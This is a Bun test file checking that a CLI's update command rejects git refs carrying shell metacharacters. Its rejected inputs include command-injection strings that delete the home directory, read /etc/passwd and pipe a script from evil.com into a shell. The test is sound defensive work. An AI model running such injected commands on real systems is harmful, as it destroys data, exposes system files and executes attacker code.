/**
 * H3 — ref allowlist validation in cmd-update.ts
 *
 * Verifies that REF_RE blocks shell metacharacters in the `ref` argument
 * before any subprocess is spawned. Pure unit-style test — invokes the
 * allowlist regex directly and uses subprocess exit-code checks for the
 * CLI surface. No mock.module needed (no module-level side effects).
 */
import { describe, it, expect } from "bun:test";
import { join } from "path";

const cliPath = join(import.meta.dir, "../src/cli.ts");

async function runCli(
  args: string[],
  opts: { env?: Record<string, string> } = {},
): Promise<{ code: number; stdout: string; stderr: string }> {
  const proc = Bun.spawn(["bun", cliPath, ...args], {
    stdout: "pipe",
    stderr: "pipe",
    env: { ...process.env, MAW_CLI: "1", ...opts.env },
  });
  const [stdout, stderr, code] = await Promise.all([
    new Response(proc.stdout).text(),
    new Response(proc.stderr).text(),
    proc.exited,
  ]);
  return { code, stdout, stderr };
}

// ─── Allowlist regex unit tests (no subprocess overhead) ──────────────────────

const REF_RE = /^[a-zA-Z0-9._\-\/]+$/;

describe("H3 — REF_RE allowlist (unit)", () => {
  it("passes valid refs", () => {
    const valid = [
      "main",
      "v2.0.0-alpha.121",
      "v2.0.0-alpha.126",
      "feat/my-branch",
      "abc1234",
      "release/2.0.0",
      "1.2.3",
      "beta",
    ];
    for (const ref of valid) {
      expect(REF_RE.test(ref)).toBe(true);
    }
  });

  it("blocks shell metacharacters", () => {
    const invalid = [
      "main; rm -rf ~",
      "main|cat /etc/passwd",
      "$(whoami)",
      "`id`",
      "main && curl evil.com/sh | sh",
      "ref with spaces",
      "ref;payload",
      "ref\nnewline",
      "ref\x00null",
    ];
    for (const ref of invalid) {
      expect(REF_RE.test(ref)).toBe(false);
    }
  });
});

// ─── CLI integration: metachar in ref → exit 1 before subprocess ─────────────

describe("H3 — cmd-update ref allowlist (CLI subprocess)", () => {
  it("rejects semicolon-injected ref with exit 1 and error message", async () => {
    const { code, stderr } = await runCli(["update", "main; curl evil.com | sh", "--yes"]);
    expect(code).toBe(1);
    expect(stderr).toContain("invalid ref");
    expect(stderr).toContain("main; curl evil.com | sh");
  }, 10_000);

  it("rejects pipe-injected ref with exit 1", async () => {
    const { code, stderr } = await runCli(["update", "main|cat /etc/passwd", "--yes"]);
    expect(code).toBe(1);
    expect(stderr).toContain("invalid ref");
  }, 10_000);

  it("rejects subshell expansion attempt with exit 1", async () => {
    const { code, stderr } = await runCli(["update", "$(whoami)", "--yes"]);
    expect(code).toBe(1);
    expect(stderr).toContain("invalid ref");
  }, 10_000);

  it("valid ref 'main' passes the allowlist gate (reaches install, not ref guard)", async () => {
    // We can't complete a real install in test, but the error must NOT be about
    // "invalid ref" — it should be about network or bun, meaning REF_RE passed.
    const { stderr } = await runCli(["update", "main", "--yes"]);
    // The ref guard must NOT fire for "main"
    expect(stderr).not.toContain("invalid ref");
  }, 15_000);

  it("valid branch name 'feat/my-feature' passes the allowlist gate", async () => {
    const { stderr } = await runCli(["update", "feat/my-feature", "--yes"]);
    expect(stderr).not.toContain("invalid ref");
  }, 15_000);
});
